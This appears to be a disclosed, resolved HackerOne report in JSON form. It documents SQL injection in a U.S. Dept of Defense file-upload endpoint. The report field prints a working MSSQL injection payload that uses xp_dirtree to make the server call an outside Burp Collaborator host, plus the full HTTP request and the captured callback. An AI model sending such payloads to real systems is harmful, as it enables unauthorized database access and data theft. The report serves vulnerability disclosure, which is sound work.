@@ -1,0 +1,118 @@
+{
+  "id": 272506,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzI1MDY=",
+  "url": "https://hackerone.com/reports/272506",
+  "title": " SQL injections",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-09-27T21:36:33.009Z",
+  "submitted_at": "2017-09-27T21:36:33.009Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lfb",
+    "url": "/lfb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/122/179/0de69a70241e723211c569d70e9107d38c6b4ee9_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-10-04T15:19:56.603Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-08-24T11:55:17.821Z",
+  "team_member_agreed_on_going_public_at": "2019-10-04T15:19:56.437Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\nAn email is not well handeled and leads to sql injection.\n**Description:**\nThis request\nPOST /FileTransfer/Upload HTTP/1.1\nHost: www.███████\n\nThe parameter **from** is injectable and leads to valid sql injection.\n## Impact\nI didn't go all out and get a shell but, an attaker could exctract db information or execute sql command on the serve with the rights of the db user.\n\n## Step-by-step Reproduction Instructions\nPayload injection \n```\n';declare @q varchar(99);set @q='\\\\4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net/random'; exec master.dbo.xp_dirtree @q;-- \n```\n\nRequest to make execute the sql command \n```\nPOST /FileTransfer/Upload HTTP/1.1\nHost: www.███\nConnection: close\nContent-Length: 269\nCache-Control: max-age=0\nOrigin: https://www.████\nUpgrade-Insecure-Requests: 1\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarybjrDo2DV1yHQWvAQ\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nDNT: 1\nReferer: https://www.█████████/FileTransfer/\nAccept-Language: en-GB,en-US;q=0.8,en;q=0.6,fr;q=0.4\n\n------WebKitFormBoundarybjrDo2DV1yHQWvAQ\nContent-Disposition: form-data; name=\"from\"\n\nhello';declare @q varchar(99);set @q='\\\\4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net/random'; exec master.dbo.xp_dirtree @q;-- \n------WebKitFormBoundarybjrDo2DV1yHQWvAQ\n```\n\nfirst I get a dns query on my burp collaborator (see sqli2.png)\n\nsecond I get the server to poll with master.dbo.xp_dirtree from 143.85.74.18 at 2017-Sep-27 21:29:55\n```\nPROPFIND /random HTTP/1.1\nHost: 4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net\nContent-Length: 0\nDepth: 0\ntranslate: f\nUser-Agent: Microsoft-WebDAV-MiniRedir/6.0.6002\nAccept-Encoding: gzip, deflate, identity\nConnection: Keep-Alive\nX-BlueCoat-Via: ██████████\n```\n\nAlso it is easy to see that the single quote breaks the sql syntax.\n\n## Suggested Mitigation/Remediation Actions\nMake prepared statement so the **'** doesnt get interpreted. (Input data validation)\nMaybe verify other parameters.",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 13,
+  "voters": [
+    "m4khn0",
+    "mik317",
+    "null_rhythm",
+    "eveeez",
+    "lumbridge",
+    "0x1b",
+    "witchking_h1",
+    "fiercepineapple",
+    "mansoorndb",
+    "rny5",
+    "and 3 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
